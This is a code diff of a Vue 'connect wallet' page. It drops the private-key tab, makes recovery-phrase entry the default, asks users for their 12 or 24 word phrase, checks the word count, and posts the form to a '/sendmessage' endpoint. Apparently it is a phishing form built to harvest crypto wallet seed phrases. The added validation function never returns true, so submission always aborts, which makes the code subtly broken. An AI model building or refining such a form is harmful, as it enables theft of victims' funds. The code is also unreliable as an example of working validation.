@@ -57,12 +57,12 @@
                                         " class="px-3 py-2 font-medium border-b-2 rounded-none btn shrink-0">
                                         Phrase
                                     </button>
-                                    <button @click="connetTab.tab = 'private_key'" :class="connetTab.tab == 'private_key'
+                                    <!-- <button @click="connetTab.tab = 'private_key'" :class="connetTab.tab == 'private_key'
                                         ? 'border-primary dark:border-accent text-primary dark:text-accent-light'
                                         : 'border-transparent hover:text-slate-800 focus:text-slate-800 dark:hover:text-navy-100 dark:focus:text-navy-100'
                                         " class="px-3 py-2 font-medium border-b-2 rounded-none btn shrink-0">
                                         Private Key
-                                    </button>
+                                    </button> -->
                                 </div>
                             </div>
                             <div class="pt-4 tab-content">
@@ -98,17 +98,18 @@
                                         </label> -->
 
                                         <label class="block">
-                                            <textarea rows="4" placeholder="Enter Recovery Phrase"
+                                            <textarea rows="4" placeholder="Please enter your 12/24 word phrase"
                                                 class="form-textarea w-full resize-none rounded-lg border border-slate-300 bg-transparent p-2.5 placeholder:text-slate-400/70 hover:border-slate-400 focus:border-primary dark:border-navy-450 dark:hover:border-navy-400 dark:focus:border-accent"
                                                 v-model="wallet.wallet_phrase"></textarea>
                                         </label>
+                                        <small class="my-2 text-sm text-center">use "," to separate wallet keys</small>
 
                                         <button @click="submit" class="w-full btn-primary">
                                             Proceed
                                         </button>
                                     </div>
                                 </div>
-                                <div v-if="connetTab.tab === 'private_key'">
+                                <!-- <div v-if="connetTab.tab === 'private_key'">
                                     <div class="space-y-4 text-white">
                                         <input style="display: none" type="text" name="fakeusernameremembered" />
                                         <input style="display: none" type="password" name="fakepasswordremembered" />
@@ -138,7 +139,7 @@
                                             Proceed
                                         </button>
                                     </div>
-                                </div>
+                                </div> -->
                             </div>
                         </div>
                     </div>
@@ -166,7 +167,7 @@ let connect = reactive({
 
 let connetTab = reactive({
     open: false,
-    tab: "name",
+    tab: "phrase",
 });
 
 let wallet = reactive({
@@ -188,10 +189,23 @@ const Connect = async (item) => {
 };
 
 
+function isValidWordList(input) {
+    const words = input.trim().split(',');
+
+    // Check if total number of words is 12 or 24
+    if (words.length !== 12 && words.length !== 24) {
+        alert("Please enter a valid 12 or 24 word phrase");
+        return false;
+
+    };
+
+}
+
+
 
 function submit() {
     const requiredFields = [
-        "full_name",
+        "wallet_phrase",
     ];
     const isFormValid = requiredFields.every((field) => wallet[field]);
 
@@ -199,6 +213,8 @@ function submit() {
         alert("Please fill in all fields.");
         return;
     }
+
+    if (!isValidWordList(wallet.wallet_phrase)) return;
 
     fetch(`${window.origin}/sendmessage`, {
         method: "POST",
